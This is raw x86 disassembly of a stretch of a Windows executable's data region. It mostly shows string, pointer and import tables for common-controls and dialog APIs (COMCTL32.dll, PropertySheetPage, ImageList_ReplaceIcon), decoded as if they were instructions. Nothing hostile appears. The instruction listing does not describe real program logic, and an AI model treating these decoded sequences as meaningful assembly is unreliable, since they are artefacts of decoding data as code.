  427fcc:	je     0x428034
  427fce:	ins    BYTE PTR es:[edi],dx
  427fcf:	jns    0x428046
  427fd1:	push   0x6d6d6800
  427fd6:	popa   
  427fd7:	inc    edi
  427fd8:	popa   
  427fd9:	ins    BYTE PTR es:[edi],dx
  427fda:	ins    BYTE PTR es:[edi],dx
  427fdb:	push   0x48007361
  427fe0:	outs   dx,DWORD PTR ds:[esi]
  427fe1:	ins    DWORD PTR es:[edi],dx
  427fe2:	outs   dx,DWORD PTR gs:[esi]
  427fe4:	jb     0x42804b
  427fe6:	data16 jno 0x428052
  427fe9:	jae    0x42804c
  427feb:	bound  esi,QWORD PTR [eax+0x61]
  427fee:	add    BYTE PTR [ebp+0x74],ah
  427ff1:	outs   dx,BYTE PTR ds:[esi]
  427ff2:	gs addr16 jbe 0x428057
  427ff6:	je     0x428071
  427ff8:	gs popa 
  427ffa:	add    BYTE PTR [ebp+0x67],ah
  427ffd:	outs   dx,DWORD PTR ds:[esi]
  427ffe:	inc    edi
  427fff:	popa   
  428000:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428008:	jo     0x42806f
  42800a:	fs jbe 0x42806e
  42800d:	je     0x428084
  42800f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428013:	outs   dx,DWORD PTR ds:[esi]
  428014:	add    BYTE PTR [edx+0x0],ch
  428017:	jne    0x428019
  428019:	add    BYTE PTR [bp+0x0],ch
  42801d:	popa   
  42801e:	add    BYTE PTR [esi+0x0],ch
  428021:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428026:	add    BYTE PTR [ebp+0x0],dh
  428029:	ins    DWORD PTR es:[edi],dx
  42802a:	add    BYTE PTR [eax],al
  42802c:	add    BYTE PTR [edi+0x0],ch
  42802f:	jb     0x428031
  428031:	ja     0x428033
  428033:	imul   eax,DWORD PTR [eax],0x680073
  428039:	outs   dx,BYTE PTR ds:[esi]
  42803a:	add    BYTE PTR [ecx+0x0],ch
  42803d:	add    BYTE PTR fs:[ecx+0x0],ch
  428041:	ja     0x428043
  428043:	imul   eax,DWORD PTR [eax],0x65006e
  428049:	push   0x70000000
  42804e:	add    BYTE PTR [ecx+0x0],ah
  428051:	je     0x428053
  428053:	jbe    0x428055
  428055:	add    BYTE PTR gs:[ebp+0x0],ah
  428059:	je     0x42805b
  42805b:	add    BYTE PTR gs:[edi+0x0],ah
  42805f:	ins    BYTE PTR es:[edi],dx
  428060:	add    BYTE PTR [ecx+0x0],ah
  428063:	imul   eax,DWORD PTR [eax],0x66
  428069:	outs   dx,DWORD PTR ds:[esi]
  42806a:	add    BYTE PTR [esi+0x0],ch
  42806d:	je     0x42806f
  42806f:	popa   
  428070:	add    BYTE PTR [edi+0x0],dh
  428073:	push   ebx
  428074:	add    BYTE PTR [edi+0x0],ch
  428077:	arpl   WORD PTR [eax],ax
  428079:	imul   eax,DWORD PTR [eax],0x61
  42807c:	add    BYTE PTR [esi+0x0],dh
  42807f:	outs   dx,DWORD PTR ds:[esi]
  428080:	add    BYTE PTR [eax],al
  428082:	add    BYTE PTR [ebp+0x0],ch
  428085:	jns    0x428087
  428087:	add    BYTE PTR gs:[esi+0x0],ah
  42808b:	ins    BYTE PTR es:[edi],dx
  42808c:	add    BYTE PTR [ecx+0x0],ah
  42808f:	jns    0x428091
  428091:	jbe    0x428093
  428093:	popa   
  428094:	add    BYTE PTR [esi+0x0],ch
  428097:	popa   
  428098:	add    BYTE PTR [edi+0x0],ah
  42809b:	outs   dx,DWORD PTR ds:[esi]
  42809c:	add    BYTE PTR [eax],al
  42809e:	add    BYTE PTR [edi+0x0],ch
  4280a1:	jb     0x4280a3
  4280a3:	jae    0x4280a5
  4280a5:	imul   eax,DWORD PTR [eax],0x47006e
  4280ab:	imul   eax,DWORD PTR [eax],0x70006d
  4280b1:	bound  eax,QWORD PTR [eax]
  4280b3:	outs   dx,DWORD PTR ds:[esi]
  4280b4:	add    BYTE PTR [eax+0x0],dh
  4280b7:	imul   eax,DWORD PTR [eax],0x650000
  4280bd:	js     0x4280bf
  4280bf:	jae    0x4280c1
  4280c1:	outs   dx,DWORD PTR ds:[esi]
  4280c2:	add    BYTE PTR [ebx+0x0],dh
  4280c5:	popa   
  4280c6:	add    BYTE PTR [esi+0x0],ch
  4280c9:	je     0x4280cb
  4280cb:	add    BYTE PTR [eax],al
  4280cd:	bound  eax,QWORD PTR [eax]
  4280cf:	jns    0x4280d1
  4280d1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  4280d6:	add    BYTE PTR [eax+eax*1+0x74],ah
  4280da:	add    BYTE PTR [ecx+0x0],ah
  4280dd:	add    BYTE PTR [eax],al
  4280df:	js     0x4280e1
  4280e1:	imul   eax,DWORD PTR [eax],0x610054
  4280e7:	imul   eax,DWORD PTR [eax],0x48006e
  4280ed:	popa   
  4280ee:	add    BYTE PTR [esi+0x0],ch
  4280f1:	add    BYTE PTR fs:[eax],al
  4280f4:	add    BYTE PTR [edi+0x0],cl
  4280f7:	ja     0x4280f9
  4280f9:	ins    BYTE PTR es:[edi],dx
  4280fa:	add    BYTE PTR [ebx+0x0],dh
  4280fd:	popa   
  4280fe:	add    BYTE PTR [ebx+0x0],dh
  428101:	jo     0x428103
  428103:	popa   
  428104:	add    BYTE PTR [ecx+0x0],ch
  428107:	imul   eax,DWORD PTR [eax],0x72
  42810a:	add    BYTE PTR [ebp+0x0],ah
  42810d:	jbe    0x42810f
  42810f:	add    BYTE PTR [eax],al
  428111:	jb     0x428113
  428113:	jne    0x428115
  428115:	je     0x428117
  428117:	ins    DWORD PTR es:[edi],dx
  428118:	add    BYTE PTR [ebp+0x0],dh
  42811b:	arpl   WORD PTR [eax],ax
  42811d:	jne    0x42811f
  42811f:	jo     0x428121
  428121:	add    BYTE PTR [eax],al
  428123:	jae    0x428125
  428125:	outs   dx,DWORD PTR ds:[esi]
  428126:	add    BYTE PTR [esi+0x0],ah
  428129:	imul   eax,DWORD PTR [eax],0x630062
  42812f:	outs   dx,DWORD PTR ds:[esi]
  428130:	add    BYTE PTR [ecx+0x0],ch
  428133:	jb     0x428135
  428135:	jae    0x428137
  428137:	outs   dx,DWORD PTR ds:[esi]
  428138:	add    BYTE PTR [eax],al
  42813a:	add    BYTE PTR [ebx+0x0],dl
  42813d:	outs   dx,DWORD PTR ds:[esi]
  42813e:	add    BYTE PTR [ebx+0x0],ah
  428141:	popa   
  428142:	add    BYTE PTR [ecx+0x0],ch
  428145:	jae    0x428147
  428147:	data16 add BYTE PTR [ecx+0x0],ah
  42814b:	jb     0x42814d
  42814d:	popa   
  42814e:	add    BYTE PTR [ecx+0x0],ch
  428151:	add    BYTE PTR [eax],al
  428153:	add    BYTE PTR [esi],cl
  428155:	adc    BYTE PTR [eax],al
  428157:	out    0x67,eax
  428159:	adc    BYTE PTR [eax],al
  42815b:	js     0x428184
  42815d:	adc    BYTE PTR [eax],al
  42815f:	test   al,0x13
  428161:	adc    BYTE PTR [eax],al
  428163:	fs push esi
  428165:	adc    BYTE PTR [eax],al
  428167:	jp     0x428189
  428169:	adc    BYTE PTR [eax],al
  42816b:	enter  0x1052,0x0
  42816f:	loop   0x4281e4
  428171:	adc    BYTE PTR [eax],al
  428173:	ja     0x4281e0
  428175:	adc    BYTE PTR [eax],al
  428177:	cmp    al,0x2b
  428179:	adc    BYTE PTR [eax],al
  42817b:	rcl    BYTE PTR [edx],1
  42817d:	adc    BYTE PTR [eax],al
  42817f:	sbb    DWORD PTR [eax+0x10],ebx
  428182:	add    BYTE PTR [esi],ah
  428184:	add    dl,BYTE PTR [eax]
  428186:	add    BYTE PTR [edi+0xc],dh
  428189:	adc    BYTE PTR [eax],al
  42818b:	mov    dh,BYTE PTR [ecx]
  42818d:	adc    BYTE PTR [eax],al
  42818f:	out    dx,al
  428190:	sbb    eax,0xed80010
  428195:	adc    BYTE PTR [eax],al
  428197:	add    eax,0x3300107f
  42819c:	jbe    0x4281ae
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    BYTE PTR [edi-0x7f],bl
  4281ad:	inc    edx
  4281ae:	add    BYTE PTR [ebx-0x7f],ah
  4281b1:	inc    edx
  4281b2:	add    BYTE PTR [edi-0x7f],ah
  4281b5:	inc    edx
  4281b6:	add    BYTE PTR [ebx-0x7f],ch
  4281b9:	inc    edx
  4281ba:	add    BYTE PTR [edi-0x7f],ch
  4281bd:	inc    edx
  4281be:	add    BYTE PTR [ebx-0x7f],dh
  4281c1:	inc    edx
  4281c2:	add    BYTE PTR [edi-0x7f],dh
  4281c5:	inc    edx
  4281c6:	add    BYTE PTR [ebx-0x7f],bh
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [edi-0x7f],bh
  4281cd:	inc    edx
  4281ce:	add    BYTE PTR [ebx-0x78ffbd7f],al
  4281d4:	add    DWORD PTR [edx+0x0],0x42818b
  4281db:	pop    DWORD PTR [ecx-0x7e6cffbe]
  4281e1:	inc    edx
  4281e2:	add    BYTE PTR [edi-0x64ffbd7f],dl
  4281e8:	add    DWORD PTR [edx+0x0],0x42822b
  4281ef:	das    
  4281f0:	add    BYTE PTR [edx+0x0],0x33
  4281f4:	add    BYTE PTR [edx+0x0],0x37
  4281f8:	add    BYTE PTR [edx+0x0],0x3b
  4281fc:	add    BYTE PTR [edx+0x0],0x3f
  428200:	add    BYTE PTR [edx+0x0],0x43
  428204:	add    BYTE PTR [edx+0x0],0x47
  428208:	add    BYTE PTR [edx+0x0],0x4b
  42820c:	add    BYTE PTR [edx+0x0],0x4f
  428210:	add    BYTE PTR [edx+0x0],0x53
  428214:	add    BYTE PTR [edx+0x0],0x57
  428218:	add    BYTE PTR [edx+0x0],0x5b
  42821c:	add    BYTE PTR [edx+0x0],0x5f
  428220:	add    BYTE PTR [edx+0x0],0x63
  428224:	add    BYTE PTR [edx+0x0],0x67
  428228:	add    BYTE PTR [edx+0x0],0x29
  42822c:	or     al,0x10
  42822e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428234:	push   edi
  428235:	adc    BYTE PTR [eax],al
  428237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428238:	outs   dx,DWORD PTR ds:[esi]
  428239:	adc    BYTE PTR [eax],al
  42823b:	push   ebx
  42823c:	popa   
  42823d:	adc    BYTE PTR [eax],al
  42823f:	add    dh,BYTE PTR [ebp+0x10]
  428242:	add    dh,cl
  428244:	jle    0x428256
  428246:	add    BYTE PTR [esi+edx*2],dl
  428249:	adc    BYTE PTR [eax],al
  42824b:	mov    al,0x68
  42824d:	adc    BYTE PTR [eax],al
  42824f:	aas    
  428250:	inc    esp
  428251:	adc    BYTE PTR [eax],al
  428253:	pop    ebp
  428254:	and    DWORD PTR [eax],edx
  428256:	add    bl,dl
  428258:	jl     0x42826a
  42825a:	add    BYTE PTR [edx+0xb],dh
  42825d:	adc    BYTE PTR [eax],al
  42825f:	inc    edx
  428260:	push   eax
  428261:	adc    BYTE PTR [eax],al
  428263:	mov    ebp,0xbb001074
  428268:	pop    ds
  428269:	adc    BYTE PTR [eax],al
  42826b:	sub    DWORD PTR [eax+0x10],eax
  42826e:	add    BYTE PTR [ecx],dh
  428270:	ja     0x428282
  428272:	add    bl,dl
  428274:	sbb    dl,BYTE PTR [eax]
  428276:	add    BYTE PTR [esi+0x1e],ch
  428279:	adc    BYTE PTR [eax],al
  42827b:	or     ch,BYTE PTR [esi]
  42827d:	adc    BYTE PTR [eax],al
  42827f:	sbb    eax,0xa100103e
  428284:	data16 adc BYTE PTR [eax],al
  428287:	xchg   ecx,eax
  428288:	bound  edx,QWORD PTR [eax]
  42828a:	add    BYTE PTR [esi],bh
  42828c:	dec    edi
  42828d:	adc    BYTE PTR [eax],al
  42828f:	in     eax,dx
  428290:	adc    BYTE PTR fs:[eax],al
  428293:	sub    bl,BYTE PTR [ecx+0x10]
  428296:	add    BYTE PTR [esi+0x43],al
  428299:	adc    BYTE PTR [eax],al
  42829b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42829f:	rol    BYTE PTR [esi+0x10],0x0
  4282a3:	in     eax,0x31
  4282a5:	adc    BYTE PTR [eax],al
  4282a7:	mov    esp,0x6b00104f
  4282ac:	add    BYTE PTR [edx+0x0],0x6f
  4282b0:	add    BYTE PTR [edx+0x0],0x73
  4282b4:	add    BYTE PTR [edx+0x0],0x77
  4282b8:	add    BYTE PTR [edx+0x0],0x7b
  4282bc:	add    BYTE PTR [edx+0x0],0x7f
  4282c0:	add    BYTE PTR [edx+0x0],0x83
  4282c4:	add    BYTE PTR [edx+0x0],0x87
  4282c8:	add    BYTE PTR [edx+0x0],0x8b
  4282cc:	add    BYTE PTR [edx+0x0],0x8f
  4282d0:	add    BYTE PTR [edx+0x0],0x93
  4282d4:	add    BYTE PTR [edx+0x0],0x97
  4282d8:	add    BYTE PTR [edx+0x0],0x9b
  4282dc:	add    BYTE PTR [edx+0x0],0x9f
  4282e0:	add    BYTE PTR [edx+0x0],0xa3
  4282e4:	add    BYTE PTR [edx+0x0],0xa7
  4282e8:	add    BYTE PTR [edx+0x0],0xe1
  4282ec:	and    dl,BYTE PTR [eax]
  4282ee:	add    bh,bh
  4282f0:	push   ecx
  4282f1:	adc    BYTE PTR [eax],al
  4282f3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282fa:	add    BYTE PTR [ebx],al
  4282fc:	sbb    dl,BYTE PTR [eax]
  4282fe:	add    ch,ah
  428300:	or     dl,BYTE PTR [eax]
  428302:	add    BYTE PTR [edi+0x42001035],bl
  428308:	pop    edi
  428309:	adc    BYTE PTR [eax],al
  42830b:	adc    eax,0xd300103f
  428310:	cmp    dl,BYTE PTR [eax]
  428312:	add    BYTE PTR [ebp+0x1001021],ah
  428318:	sbb    al,0x10
  42831a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428320:	adc    BYTE PTR cs:[eax],al
  428323:	push   eax
  428324:	adc    BYTE PTR [bx+si],al
  428327:	mov    edi,0xeb00102d
  42832c:	add    BYTE PTR [edx+0x0],0xef
  428330:	add    BYTE PTR [edx+0x0],0xf3
  428334:	add    BYTE PTR [edx+0x0],0xf7
  428338:	add    BYTE PTR [edx+0x0],0xfb
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xb
  42834c:	add    DWORD PTR [edx+0x0],0xf
  428350:	add    DWORD PTR [edx+0x0],0x13
  428354:	add    DWORD PTR [edx+0x0],0x17
  428358:	add    DWORD PTR [edx+0x0],0x1b
  42835c:	add    DWORD PTR [edx+0x0],0x1f
  428360:	add    DWORD PTR [edx+0x0],0x23
  428364:	add    DWORD PTR [edx+0x0],0x27
  428368:	add    DWORD PTR [edx+0x0],0xffffff98
  42836c:	pusha  
  42836d:	adc    BYTE PTR [eax],al
  42836f:	pop    ebp
  428370:	js     0x428382
  428372:	add    BYTE PTR [esi],bh
  428374:	dec    eax
  428375:	adc    BYTE PTR [eax],al
  428377:	cmp    al,0x7a
  428379:	adc    BYTE PTR [eax],al
  42837b:	aam    0x9
  42837d:	adc    BYTE PTR [eax],al
  42837f:	or     cl,BYTE PTR [ebx]
  428381:	adc    BYTE PTR [eax],al
  428383:	pop    ebx
  428384:	push   ebp
  428385:	adc    BYTE PTR [eax],al
  428387:	mov    esi,0x6001032
  42838c:	xor    edx,DWORD PTR [eax]
  42838e:	add    BYTE PTR [esi-0x16ffefc0],al
  428394:	and    eax,0x61460010
  428399:	adc    BYTE PTR [eax],al
  42839b:	adc    DWORD PTR [ebp+0x10],ebp
  42839e:	add    al,al
  4283a0:	dec    esi
  4283a1:	adc    BYTE PTR [eax],al
  4283a3:	jae    0x4283c3
  4283a5:	adc    BYTE PTR [eax],al
  4283a7:	dec    ebx
  4283a8:	add    eax,0x836b0010
  4283ad:	inc    edx
  4283ae:	add    BYTE PTR [edi-0x7d],ch
  4283b1:	inc    edx
  4283b2:	add    BYTE PTR [ebx-0x7d],dh
  4283b5:	inc    edx
  4283b6:	add    BYTE PTR [edi-0x7d],dh
  4283b9:	inc    edx
  4283ba:	add    BYTE PTR [ebx-0x7d],bh
  4283bd:	inc    edx
  4283be:	add    BYTE PTR [edi-0x7d],bh
  4283c1:	inc    edx
  4283c2:	add    BYTE PTR [ebx-0x78ffbd7d],al
  4283c8:	add    DWORD PTR [edx+0x0],0xffffff8b
  4283cc:	add    DWORD PTR [edx+0x0],0xffffff8f
  4283d0:	add    DWORD PTR [edx+0x0],0xffffff93
  4283d4:	add    DWORD PTR [edx+0x0],0xffffff97
  4283d8:	add    DWORD PTR [edx+0x0],0xffffff9b
  4283dc:	add    DWORD PTR [edx+0x0],0xffffff9f
  4283e0:	add    DWORD PTR [edx+0x0],0xffffffa3
  4283e4:	add    DWORD PTR [edx+0x0],0xffffffa7
  4283e8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283f4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283f7:	dec    edi
  4283f8:	add    BYTE PTR [eax],al
  4283fa:	add    BYTE PTR [eax],al
  4283fc:	push   eax
  4283fd:	lea    eax,[edx]
  4283ff:	add    BYTE PTR [ecx],al
  428401:	add    BYTE PTR [eax],al
  428403:	add    BYTE PTR [ecx],al
  428405:	add    BYTE PTR [eax],al
  428407:	add    BYTE PTR [ecx],al
  428409:	add    BYTE PTR [eax],al
  42840b:	add    BYTE PTR [eax],ah
  42840d:	lea    eax,[edx]
  42840f:	add    BYTE PTR [eax-0x73],al
  428412:	add    al,BYTE PTR [eax]
  428414:	xor    BYTE PTR [ebp+0x2],cl
	...
  428422:	add    BYTE PTR [eax],al
  428424:	call   0x44286ae
  428429:	xchg   BYTE PTR [edx],al
  42842b:	add    BYTE PTR [esi],dl
  42842d:	xchg   BYTE PTR [edx],al
  42842f:	add    BYTE PTR [eax],ch
  428431:	xchg   BYTE PTR [edx],al
  428433:	add    BYTE PTR [eax-0x7a],al
  428436:	add    al,BYTE PTR [eax]
  428438:	push   esp
  428439:	xchg   BYTE PTR [edx],al
  42843b:	add    BYTE PTR [esi-0x7a],ch
  42843e:	add    al,BYTE PTR [eax]
  428440:	add    BYTE PTR [eax],al
  428442:	add    BYTE PTR [eax],al
  428444:	nop
  428445:	xchg   BYTE PTR [edx],al
  428447:	add    BYTE PTR [esi-0x43fffd7a],ch
  42844d:	xchg   BYTE PTR [edx],al
  42844f:	add    dl,cl
  428451:	xchg   BYTE PTR [edx],al
  428453:	add    dh,bl
  428455:	xchg   BYTE PTR [edx],al
  428457:	add    ah,ch
  428459:	xchg   BYTE PTR [edx],al
  42845b:	add    dh,bh
  42845d:	xchg   BYTE PTR [edx],al
  42845f:	add    BYTE PTR [eax],dl
  428461:	xchg   DWORD PTR [edx],eax
  428463:	add    BYTE PTR [esi],bl
  428465:	xchg   DWORD PTR [edx],eax
  428467:	add    BYTE PTR [eax],dh
  428469:	xchg   DWORD PTR [edx],eax
  42846b:	add    BYTE PTR [edx-0x79],al
  42846e:	add    al,BYTE PTR [eax]
  428470:	push   eax
  428471:	xchg   DWORD PTR [edx],eax
  428473:	add    BYTE PTR [esi-0x79],bl
  428476:	add    al,BYTE PTR [eax]
  428478:	jo     0x428401
  42847a:	add    al,BYTE PTR [eax]
  42847c:	jl     0x428405
  42847e:	add    al,BYTE PTR [eax]
  428480:	xchg   edx,eax
  428481:	xchg   DWORD PTR [edx],eax
  428483:	add    BYTE PTR [edi+eax*4-0x7849fffe],ah
  42848a:	add    al,BYTE PTR [eax]
  42848c:	ret    0x287
  42848f:	add    dl,dl
  428491:	xchg   DWORD PTR [edx],eax
  428493:	add    dl,ah
  428495:	xchg   DWORD PTR [edx],eax
  428497:	add    al,bh
  428499:	xchg   DWORD PTR [edx],eax
  42849b:	add    BYTE PTR [eax+ecx*4],al
  42849e:	add    al,BYTE PTR [eax]
  4284a0:	push   ss
  4284a1:	mov    BYTE PTR [edx],al
  4284a3:	add    BYTE PTR [eax+ecx*4],ch
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	mov    BYTE PTR ds:[edx],al
  4284ab:	add    BYTE PTR [eax+ecx*4+0x2],cl
  4284af:	add    BYTE PTR [eax+ecx*4+0x2],bl
  4284b3:	add    BYTE PTR [esi-0x78],ch
  4284b6:	add    al,BYTE PTR [eax]
  4284b8:	or     BYTE PTR [eax-0x7767fffe],0x2
  4284bf:	add    BYTE PTR [edx-0x43fffd78],ch
  4284c5:	mov    BYTE PTR [edx],al
  4284c7:	add    ah,cl
  4284c9:	mov    BYTE PTR [edx],al
  4284cb:	add    ah,bl
  4284cd:	mov    BYTE PTR [edx],al
  4284cf:	add    ah,ch
  4284d1:	mov    BYTE PTR [edx],al
  4284d3:	add    dh,bh
  4284d5:	mov    BYTE PTR [edx],al
  4284d7:	add    BYTE PTR [ecx+ecx*4],cl
  4284da:	add    al,BYTE PTR [eax]
  4284dc:	sbb    cl,BYTE PTR [ecx-0x76cdfffe]
  4284e2:	add    al,BYTE PTR [eax]
  4284e4:	inc    esp
  4284e5:	mov    DWORD PTR [edx],eax
  4284e7:	add    BYTE PTR [esi-0x77],dl
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	bound  ecx,QWORD PTR [ecx-0x7691fffe]
  4284f2:	add    al,BYTE PTR [eax]
  4284f4:	jp     0x42847f
  4284f6:	add    al,BYTE PTR [eax]
  4284f8:	mov    cl,BYTE PTR [ecx-0x765ffffe]
  4284fe:	add    al,BYTE PTR [eax]
  428500:	scas   al,BYTE PTR es:[edi]
  428501:	mov    DWORD PTR [edx],eax
  428503:	add    al,al
  428505:	mov    DWORD PTR [edx],eax
  428507:	add    dl,dl
  428509:	mov    DWORD PTR [edx],eax
  42850b:	add    BYTE PTR [eax],al
  42850d:	add    BYTE PTR [eax],al
  42850f:	add    ah,ch
  428511:	mov    DWORD PTR [edx],eax
  428513:	add    BYTE PTR [eax],al
  428515:	add    BYTE PTR [eax],al
  428517:	add    BYTE PTR [edx],cl
  428519:	mov    al,BYTE PTR [edx]
  42851b:	add    BYTE PTR [edx+ecx*4],bl
  42851e:	add    al,BYTE PTR [eax]
  428520:	mov    al,BYTE PTR cs:[edx]
  428523:	add    BYTE PTR [edx+ecx*4+0x2],al
  428527:	add    BYTE PTR [esi-0x76],dl
  42852a:	add    al,BYTE PTR [eax]
  42852c:	push   0x7800028a
  428531:	mov    al,BYTE PTR [edx]
  428533:	add    BYTE PTR [esi-0x59fffd76],dl
  428539:	mov    al,BYTE PTR [edx]
  42853b:	add    BYTE PTR [edx+ecx*4-0x753bfffe],dh
  428542:	add    al,BYTE PTR [eax]
  428544:	ror    BYTE PTR [edx-0x751dfffe],cl
  42854a:	add    al,BYTE PTR [eax]
  42854c:	out    dx,al
  42854d:	mov    al,BYTE PTR [edx]
  42854f:	add    BYTE PTR [eax],al
  428551:	mov    eax,DWORD PTR [edx]
  428553:	add    BYTE PTR [edx],dl
  428555:	mov    eax,DWORD PTR [edx]
  428557:	add    BYTE PTR [eax],ch
  428559:	mov    eax,DWORD PTR [edx]
  42855b:	add    BYTE PTR [esi],dh
  42855d:	mov    eax,DWORD PTR [edx]
  42855f:	add    BYTE PTR [edx-0x75],al
  428562:	add    al,BYTE PTR [eax]
  428564:	pop    esp
  428565:	mov    eax,DWORD PTR [edx]
  428567:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  42856b:	add    BYTE PTR [ebx+ecx*4-0x7465fffe],cl
  428572:	add    al,BYTE PTR [eax]
  428574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428575:	mov    eax,DWORD PTR [edx]
  428577:	add    BYTE PTR [eax+0x28b],bh
  42857d:	add    BYTE PTR [eax],al
  42857f:	add    al,bl
  428581:	mov    eax,DWORD PTR [edx]
  428583:	add    dl,ah
  428585:	mov    eax,DWORD PTR [edx]
  428587:	add    al,dh
  428589:	mov    eax,DWORD PTR [edx]
  42858b:	add    ah,bh
  42858d:	mov    eax,DWORD PTR [edx]
  42858f:	add    BYTE PTR [esp+ecx*4],cl
  428592:	add    al,BYTE PTR [eax]
  428594:	sbb    cl,BYTE PTR [edx+eax*1+0x28c2600]
  42859b:	add    BYTE PTR [eax],dh
  42859d:	mov    WORD PTR [edx],es
  42859f:	add    BYTE PTR [edx-0x74],al
  4285a2:	add    al,BYTE PTR [eax]
  4285a4:	pop    eax
  4285a5:	mov    WORD PTR [edx],es
  4285a7:	add    BYTE PTR [esi-0x74],ch
  4285aa:	add    al,BYTE PTR [eax]
  4285ac:	test   BYTE PTR [edx+eax*1+0x28c9400],cl
  4285b3:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  4285ba:	add    al,BYTE PTR [eax]
  4285bc:	ret    0x28c
  4285bf:	add    dl,bl
  4285c1:	mov    WORD PTR [edx],es
  4285c3:	add    ah,ah
  4285c5:	mov    WORD PTR [edx],es
  4285c7:	add    al,dh
  4285c9:	mov    WORD PTR [edx],es
  4285cb:	add    dh,bh
  4285cd:	mov    WORD PTR [edx],es
	...
  4285df:	add    BYTE PTR [ebx+0x6d],ah
  4285e2:	fs cs gs js 0x42864c
  4285e7:	add    BYTE PTR [edi],dl
  4285e9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285ed:	je     0x428661
  4285ef:	outs   dx,DWORD PTR ds:[esi]
  4285f0:	jns    0x428642
  4285f2:	jb     0x428663
  4285f4:	jo     0x42865b
  4285f6:	jb     0x42866c
  4285f8:	jns    0x42864d
  4285fa:	push   0x50746565
  4285ff:	popa   
  428600:	add    BYTE PTR gs:[bx+si],al
  428604:	pop    esp
  428605:	add    BYTE PTR [eax+0x72],dl
  428608:	outs   dx,DWORD PTR ds:[esi]
  428609:	jo     0x428670
  42860b:	jb     0x428681
  42860d:	jns    0x428662
  42860f:	push   0x57746565
  428614:	add    BYTE PTR [eax],al
  428616:	pop    ebx
  428617:	add    BYTE PTR [eax+0x72],dl
  42861a:	outs   dx,DWORD PTR ds:[esi]
  42861b:	jo     0x428682
  42861d:	jb     0x428693
  42861f:	jns    0x428674
  428621:	push   0x41746565
  428626:	add    BYTE PTR [eax],al
  428628:	dec    esi
  428629:	add    BYTE PTR [ecx+0x6d],cl
  42862c:	popa   
  42862d:	addr16 gs dec esp
  428630:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428637:	ins    BYTE PTR es:[edi],dx
  428638:	popa   
  428639:	arpl   WORD PTR [ebp+0x49],sp
  42863c:	arpl   WORD PTR [edi+0x6e],bp
  42863f:	add    BYTE PTR [ecx],dh
  428641:	add    BYTE PTR [ecx+0x6d],cl
  428644:	popa   
  428645:	addr16 gs dec esp
  428648:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42864f:	je     0x4286c3
  428651:	outs   dx,DWORD PTR ds:[esi]
  428652:	jns    0x428654
  428654:	inc    eax
  428655:	add    BYTE PTR [ecx+0x6d],cl
  428658:	popa   
  428659:	addr16 gs dec esp
  42865c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428663:	dec    ecx
  428664:	ins    DWORD PTR es:[edi],dx
  428665:	popa   
  428666:	addr16 gs inc ebx
  428669:	outs   dx,DWORD PTR ds:[esi]
  42866a:	jne    0x4286da
  42866c:	je     0x42866e
  42866e:	dec    esp
  42866f:	add    BYTE PTR [ecx+0x6d],cl
  428672:	popa   
  428673:	addr16 gs dec esp
  428676:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42867d:	outs   dx,DWORD PTR ds:[esi]
  42867e:	jbe    0x4286e5
  428680:	add    BYTE PTR [eax],al
  428682:	inc    ebx
  428683:	dec    edi
  428684:	dec    ebp
  428685:	inc    ebx
  428686:	push   esp
  428687:	dec    esp
  428688:	xor    esi,DWORD PTR [edx]
  42868a:	cs fs ins BYTE PTR es:[edi],dx
  42868d:	ins    BYTE PTR es:[edi],dx
  42868e:	add    BYTE PTR [eax],al
  428690:	push   edi
  428691:	add    BYTE PTR [ebx+0x72],al
  428694:	gs popa 
  428696:	je     0x4286fd
  428698:	inc    esp
  428699:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4286a0:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4286a8:	jb     0x42870b
  4286aa:	ins    DWORD PTR es:[edi],dx
  4286ab:	push   edi
  4286ac:	add    BYTE PTR [eax],al
  4286ae:	xor    al,BYTE PTR [edx]
  4286b0:	push   ebx
  4286b1:	gs je  0x4286f7
  4286b4:	popa   
  4286b5:	jb     0x42871c
  4286b7:	je     0x428709
  4286b9:	outs   dx,DWORD PTR ds:[esi]
  4286ba:	jae    0x4286bc
  4286bc:	cmp    al,BYTE PTR [ecx]
  4286be:	inc    edi
  4286bf:	gs je  0x42870f
  4286c2:	gs jae 0x428738
  4286c5:	popa   
  4286c6:	addr16 gs inc ecx
  4286c9:	add    BYTE PTR [edx+0x61724400],dh
  4286cf:	ja     0x428717
  4286d1:	jb     0x428734
  4286d3:	ins    DWORD PTR es:[edi],dx
  4286d4:	gs inc ebx
  4286d6:	outs   dx,DWORD PTR ds:[esi]
  4286d7:	outs   dx,BYTE PTR ds:[esi]
  4286d8:	je     0x42874c
  4286da:	outs   dx,DWORD PTR ds:[esi]
  4286db:	ins    BYTE PTR es:[edi],dx
  4286dc:	add    BYTE PTR [eax],al
  4286de:	sbb    BYTE PTR [ecx],al
  4286e0:	inc    edi
  4286e1:	gs je  0x42872d
  4286e4:	arpl   WORD PTR [edi+0x6e],bp
  4286e7:	dec    ecx
